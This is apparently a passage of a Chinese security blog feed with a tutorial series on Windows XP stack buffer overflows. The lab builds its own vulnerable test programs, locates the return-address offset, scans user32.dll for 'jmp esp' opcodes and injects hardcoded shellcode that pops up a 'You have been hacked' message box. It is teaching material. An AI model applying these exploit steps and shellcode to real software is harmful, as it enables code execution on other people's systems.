class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] =</span><br><span class="line"><span class="string">&quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot;</span> <span class="comment">//name[0]~name[7]</span></span><br><span class="line"><span class="string">&quot;\x42\x42\x42\x42&quot;</span><span class="comment">//EBP</span></span><br><span class="line"><span class="string">&quot;\x79\x5b\xe3\x77&quot;</span><span class="comment">//ReturnAddress</span></span><br><span class="line"><span class="string">&quot;\x83\xEC\x50&quot;</span><span class="comment">//subesp,0x50</span></span><br><span class="line"><span class="string">&quot;\x33\xDB&quot;</span><span class="comment">//xorebx,ebx</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span><span class="comment">//pushebx</span></span><br><span class="line"><span class="string">&quot;\x68\x69\x6E\x67\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x57\x61\x72\x6E&quot;</span><span class="comment">//push&quot;Warning&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xC4&quot;</span><span class="comment">//moveax,esp</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span><span class="comment">//pushebx</span></span><br><span class="line"><span class="string">&quot;\x68\x79\x29\x20\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x20\x54\x61\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x21\x28\x62\x79&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x63\x6B\x65\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x6E\x20\x68\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x20\x62\x65\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x68\x61\x76\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x59\x6F\x75\x20&quot;</span><span class="comment">//push&quot;Youhavebeenhacked!(by Taoy)&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xCC&quot;</span><span class="comment">//movecx,esp</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span><span class="comment">//pushebx</span></span><br><span class="line"><span class="string">&quot;\x50&quot;</span><span class="comment">//pusheax</span></span><br><span class="line"><span class="string">&quot;\x51&quot;</span><span class="comment">//pushecx</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span><span class="comment">//pushebx</span></span><br><span class="line"><span class="string">&quot;\xB8\xea\x07\xd5\x77&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span><span class="comment">//callMessageBox</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xB8\xFA\xCA\x81\x7C&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>); <span class="comment">// 加载 user32.dll 动态链接库</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后运行程序，可以看到我们已经成功利用了漏洞：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118153644848.png" alt="image-20200118153644848"></p><p>我们接下来使用OD调试，一步一步跟进，发现指向完<code>jmp esp</code>，跳转到了我们的shellcode处</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118160152832.png" alt="image-20200118160152832"></p><p>我们继续往下,下图显示的过程就是把<code>MessageBox()</code>函数的参数入栈，然后call 这个函数</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118160255053.png" alt="image-20200118160255053"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118160440020.png" alt="image-20200118160440020"></p><p>最后，我们观察一下数据以及堆栈的情况：</p><p>我们跳转到esp处（在数据区域, <code>ctrl+G</code>, 输入 <code>esp</code>），查看栈区域的数据:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118160811255.png" alt="image-20200118160811255"></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://blog.csdn.net/ioio_jy/article/details/48316111">https://blog.csdn.net/ioio_jy/article/details/48316111</a> </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt;切入正题，这次我们进行shellcode编写，只是基础的编写，不会涉及的太复杂，我们这次编写的shellcode就是让程序自动弹出一个对话框，我这里使用的c语言中的`MessageBox()`这个函数来进行编写。&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们首先需要</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="溢出攻击" scheme="http://www.ywboy.cn/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>缓冲区溢出的利用(二)</title>
    <link href="http://www.ywboy.cn/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8-%E4%BA%8C/"/>
    <id>http://www.ywboy.cn/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8-%E4%BA%8C/</id>
    <published>2020-10-06T00:28:44.000Z</published>
    <updated>2020-10-28T07:21:15.175Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出利用"><a href="#缓冲区溢出利用" class="headerlink" title="缓冲区溢出利用"></a>缓冲区溢出利用</h1><pre><code> 我们这次的环境跟上一篇一样，上一篇只是分析了发生的原因，这一篇我们就对产生缓冲区溢出进行利用，还是之前那两个程序`test1.exe` and `test2.exe`的基础上进行讲解，所以上一篇一定要理解！！！</code></pre><p>缓冲区溢出程序，<code>test2.exe</code>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //引入头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;betaobetaobetao&quot;</span>;  <span class="comment">//定义全局变量,！！！ 注意，这里多了两个betao</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//返回值 主函数main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];   <span class="comment">//开辟8个字节的空间用来存储变量name</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//内置函数（作用）：将变量name内容赋值给buffer变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//输出</span></span><br><span class="line">    getchar();               <span class="comment">//方便观察 作用：等待用户输入按键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这里我们需要分成几个步骤：</p><ul><li><p><strong>1.精确定位返回地址的位置</strong></p></li><li><p><strong>2.寻找覆盖原始返回地址的地址</strong></p></li><li><p><strong>3.编写shellcode到相应的缓冲区</strong>(这一步会涉及很多东西，汇编语言等，所以下一篇说)</p><p>经过上一篇，补充内容中，我们通过程序报错的显示，很快的找到了<code>Address</code>,报错地址是<code>0x006f6174</code>,我们通过把十六进制转换成ASCII码：</p></li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221102439540.png" alt="image-20191221102439540"></p><pre><code>  这里的`tao`正好是我们输入那一串长字符的最后三个字母，由于地址是4个字节表示，如果我将全局变量`name`赋值为`betaobetaobeXXXX`那么也就是说，四个`X`就是我们覆盖的返回地址，我们上次也说了，`buffer`变量只有8个字节的空间，后面四个字节`aobe`是父函数EBP的地址，到这里，我们也就解决了第一个问题----&gt;   **精确定位返回地址的位置**。</code></pre><p>​    这里还有一个问题需要说明一下，因为我们这个程序的局部变量<code>buffer</code>只有8个字节，因此很容易就能够被填充满，从而很容易就能够被定位，但是如果缓冲区空间很大，该如何定位呢？总不能还是重复<code>betaobetaobetao...</code>吧，我们这里使用26个大写字符与小写字符，一共52个字符进行测试，一次就可以验证52个字节的缓冲区空间。</p><p>​    我们这里修改局部变量数组大小为80,我们加两端英文字符，也就是104个字符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //引入头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>;  <span class="comment">//定义全局变量,！！！</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//返回值 主函数main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">80</span>];   <span class="comment">//开辟80个字节的空间用来存储变量name ！！！</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//内置函数（作用）：将变量name内容赋值给buffer变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//输出</span></span><br><span class="line">    getchar();               <span class="comment">//方便观察 作用：等待用户输入按键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 将以上C代码程序编译…,然后运行</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221104145203.png" alt="image-20191221104145203"></p><p>​    在Address后可以发现，其值为0x6a696867，注意我们的系统是<strong>小端显示</strong>，也就是说，实际的字符应该是0x67、0x68、0x69、0x6a。那么把它转换成字母，可以知道是g、h、i、j  </p><p>通过python转换成ASCII码：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221104444316.png" alt="image-20191221104444316"></p><p>我们来分析一下，为什么是<code>ghij</code>,看下图</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221105144039.png" alt="image-20191221105144039"></p><p>ok,我们回到我们简单的程序</p><p>​    经过上面的分析，我们还需要确定<code>betaobetaobeXXXX</code>中的最后四个“X”应该是什么地址。这里我们不能凭空创造一个地址，而是应该基于一个合法地址的基础之上。当然我们通过在OD中的观察，确实能够找到很多合适的地址，但是这种方法不具有通用性，毕竟要找一个确切的地址还是不那么方便的。解决这个问题的方法有很多种，但是最为常用最为经典的，就是<code>jmp esp</code>方法，也就是利用跳板进行跳转。</p><p>​    这里的跳板是程序中原有的机器代码，它们都是能够跳转到一个寄存器内所存放的地址进行执行，如<code>jmp esp</code>、<code>call esp</code>、<code>jmp ecx</code>、<code>call eax</code>等等。如果在函数返回的时候，CPU内寄存器刚好直接或者间接指向ShellCode的开头，这样就可以把对栈内存放的返回地址的那一个元素覆盖为相应的跳板地址。</p><p>​    我们画图来理解一下，上面的话是什么意思.</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221110334737.png" alt="image-20191221110334737"></p><p>我们也用OD载入上一篇中的<code>test1.exe</code>，来具体分析一下，上面说的什么意思！</p><p>我们直接执行到mian函数最后一个地址，然后F8一步步执行到<code>0x4010a6</code>地址中, 即retn语句处，此时我们关注一下esp寄存器所保存的值：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221111335755.png" alt="image-20191221111335755"></p><p>关注我标箭头的几个位置，我们继续执行：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221111542971.png" alt="image-20191221111542971"></p><p>主要关注esp的值。可以发现，esp的值由刚才的<code>0x0012FF84</code>变成了<code>0x0012FF88</code>，从栈空间来看，即刚才那个值的下一个位置。不要忘了，<code>0x0012FF84</code>位置正式我们想要修改的返回地址的位置。</p><p>​    总结一下，我们可以得知，当main函数执行完毕的时候，esp的值会自动变成返回地址的下一个位置，而esp的这种变化，一般是不受任何情况影响的。既然我们知道了这一个特性，那么其实就可以将返回地址修改为esp所保存的地址，也就是说，我们可以让程序跳转到esp所保存的地址中，去执行我们所构造的指令，以便让计算机执行。</p><p>​         当然了，以上我所讲的是正常的情况，也就是返回地址没有被破坏的情况，那么如果返回地址被破坏了，esp还具备这种特性吗？不妨再用OD载入<code>test4.exe</code>这个存在缓冲区溢出问题的程序，来研究一下，因为我们之前的字符长度,没办法覆盖到shellcode部分，所以我们加长字符，c代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //引入头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;betaobetaobetaobetaobetao&quot;</span>;  <span class="comment">//定义全局变量,！！！</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//返回值 主函数main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];   <span class="comment">//开辟80个字节的空间用来存储变量name ！！！</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//内置函数（作用）：将变量name内容赋值给buffer变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//输出</span></span><br><span class="line">    getchar();               <span class="comment">//方便观察 作用：等待用户输入按键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先还是先来到main函数的retn的位置：  </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221112251752.png" alt="image-20191221112251752"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221112542641.png" alt="image-20191221112542641"></p><p>到这里我们就应该知道，为什么要跳转了吧？？？那么我们接下来要解决的就是，如果让程序跳转到 esp的位置呢，也就是执行<code>jmp esp</code> 这条指令 ,<code>jmp esp</code>指令对应的机器码是<code>0xFFE4</code>  </p><p>我们接下来编写一个程序，来在<code>user32.dll</code>这个动态链接库中寻找<code>jmp esp</code>这个机器指令的内存地址（<code>jmp esp</code>很多动态链接库都有，这里只是做一个例子）：</p><p>C代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_NAME <span class="meta-string">&quot;user32.dll&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BYTE* ptr;</span><br><span class="line">    <span class="keyword">int</span> position,address;</span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    BOOL done_flag = FALSE;</span><br><span class="line">    handle=LoadLibrary(DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>(!handle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; load dll erro !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = (BYTE*)handle;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(position = <span class="number">0</span>; !done_flag; position++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ptr[position] == <span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>] == <span class="number">0xE4</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//0xFFE4 is the opcode of jmp esp</span></span><br><span class="line">                <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>,address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(...)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;END OF 0x%x\n&quot;</span>, address);</span><br><span class="line">            done_flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221144508319.png" alt="image-20191221144508319"></p><p>注：编译运行，文件名必须是<code>.cpp</code>后缀，不能<code>.c</code></p><p>由上图可以看到，地址非常多，这里我使用倒数第二行<code>0x77e35b79</code>，也就是说，我需要使用这个地址来覆盖程序的返回地址。这样，程序在返回时，就会执行jmp esp，从而跳到返回地址下一个位置去执行该地址处的语句。  </p><p>​    还有一个注意点：有很多种方法可以获取jmp esp，而且不同的系统这个地址可能是不同的。</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221144833652.png" alt="image-20191221144833652"></p><p>接下来我们进行地址的验证。我们随便附加一个进程可执行文件。</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191221145211651.png" alt="image-20191221145211651"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    到这里可以先总结一下我们即将编写<code>name</code>数组中的内容了，经过以上分析可知道，其形式为<code>betaobetaobeXXXXShellcode...</code>,前面12个为任意字符，XXXX返回地址我们使用<code>0x77e35b79</code></p><p>而<code>Shellcode....</code>便是我们想要计算机执行的代码。shellcode编写待更…(需要汇编基础)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;缓冲区溢出利用&quot;&gt;&lt;a href=&quot;#缓冲区溢出利用&quot; class=&quot;headerlink&quot; title=&quot;缓冲区溢出利用&quot;&gt;&lt;/a&gt;缓冲区溢出利用&lt;/h1&gt;&lt;pre&gt;&lt;code&gt; 我们这次的环境跟上一篇一样，上一篇只是分析了发生的原因，这一篇我们就对产生缓冲区溢</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="溢出攻击" scheme="http://www.ywboy.cn/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>缓冲区溢出原理分析(一)</title>
    <link href="http://www.ywboy.cn/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/"/>
    <id>http://www.ywboy.cn/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/</id>
    <published>2020-10-06T00:25:57.000Z</published>
    <updated>2020-10-28T07:19:13.680Z</updated>
    
    <content type="html"><![CDATA[<p> 什么是缓冲区溢出？？？先作下类比，如果某个人把一瓶啤酒全部倒入一个小杯子中，那装不下的啤酒就会四处冒出，流到桌子上。</p><p>  同样的道理，在计算机内部，输入数据通常被存放在一个临时空间内，这个临时存放空间就被称为缓冲区，缓冲区的长度事先已经被程序或者操作系统定义好了。缓冲区就很像那个啤酒杯，用来装东西，而且大小固定。</p><p>  向缓冲区内填充数据，如果数据的长度很长（如同那瓶啤酒），超过了缓冲区（那个啤酒杯）本身的容量，那么结果就如同啤酒一样，四处溢出，数据也会溢出存储空间！装不下的啤酒会流到桌子上，而装不下的数据则会覆盖在合法数据上，这就是缓冲区和缓冲区溢出的道理。当然在理想的情况下，程序检查每个数据的长度，并且不允许超过缓冲区的长度大小，就像在倒啤酒的时候，啤酒要冒出杯子时我们就停止。但有些程序会假设数据长度总是与所分配的存储空间相匹配，而不作检查，从而为缓冲区溢出埋下隐患。OK，那我们如何利用缓冲区溢出呢在一般情况下，就像啤酒会到处流满桌面一样，溢出的数据会覆盖掉任何数据、指针或内容。除了破坏之外，对攻击者来说没有任何好处。但我们可引导溢出的数据，使计算机执行我们想要的命令。这就是很多漏洞公告上说的：‘黑客可以用精心构造的数据……</p><p>​                                                                                - &gt; 摘选自 王炜老师的《<em>Q版缓冲区</em>溢出教程》</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>操作机： windows XP</p><p>工具： <a href="https://www.52pojie.cn/thread-675251-1-1.html">DA</a> pro , <a href="https://www.52pojie.cn/thread-350397-1-1.html">OllyDbg</a>，vc++6.0； </p><p>测试软件：test1.exe,    test2.exe</p></blockquote><p>我们下面的实验是通过编写两个C例程序，使用工具OD，IDA pro进行逆向分析。针对汇编语句中CALL机制剖析缓冲区溢出的基本原理 。</p><h2 id="实验准备："><a href="#实验准备：" class="headerlink" title="实验准备："></a>实验准备：</h2><p>编写C代码程序，编译</p><p>test1.c,代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //引入头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;betao&quot;</span>;  <span class="comment">//定义全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//返回值 主函数main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];   <span class="comment">//开辟8个字节的空间用来存储变量name</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//内置函数（作用）：将变量name内容赋值给buffer变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//输出</span></span><br><span class="line">    getchar();               <span class="comment">//方便观察 作用：等待用户输入按键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以上test1.c代码中，因为’betao’为超过buffer的空间，所以不会引起缓冲区溢出</p></blockquote><p>test2.c代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //引入头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;betaobetaobetao&quot;</span>;  <span class="comment">//定义全局变量,！！！ 注意，这里多了两个betao</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//返回值 主函数main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];   <span class="comment">//开辟8个字节的空间用来存储变量name</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//内置函数（作用）：将变量name内容赋值给buffer变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//输出</span></span><br><span class="line">    getchar();               <span class="comment">//方便观察 作用：等待用户输入按键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以上test2.c代码，因为copy给buffer超出了空间，所以导致缓冲区溢出</p></blockquote><p>将C语言代码使用vc++6.0编程成可执行文件，大概步骤</p><blockquote><p>新建win32 console application -&gt; 新建 C++ 源文件 -&gt; 编写代码  -&gt; 编译(选择win32 Debug) -&gt; 生成exe可执行文件</p><p><strong>编译选择win32 debug操作如下：</strong></p><p> 右键点击菜单空白处——选择“组建”——选择“Win32 Debug“——重新编译链接</p></blockquote><p>  首先，我们先来运行一些编译好了的可执行文件<code>test1.exe</code> and <code>test2.exe</code>，看看两者区别</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220211457759.png" alt="image-20191220211457759"></p><p>第一个程序，没有任何异常</p><p>   可见程序已经得到了正确的执行与输出。但是我在程序中所创建出来的是一个8字节长度的数组，而我在程序中的输入是5个字节。如果我的输入超过八个字节会怎么样呢？</p><p>接下来，我们执行第二个程序</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220211551187.png" alt="image-20191220211551187"></p><p>可见，程序虽然也能够正确输出，但是却弹出了错误提示对话框。为什么会出现这种情况？我们接下来就来研究一下。</p><p>我们首先分析一下无异常的程序，也就是<code>test1.exe</code>，这里我们使用ollydbg来分析</p><p>将<code>test1.exe</code>载入ollydbg中，ollydbg载入方式有两种：</p><ul><li>鼠标直接将exe执行程序拖入OD控件区域</li><li>文件     -&gt;    附加    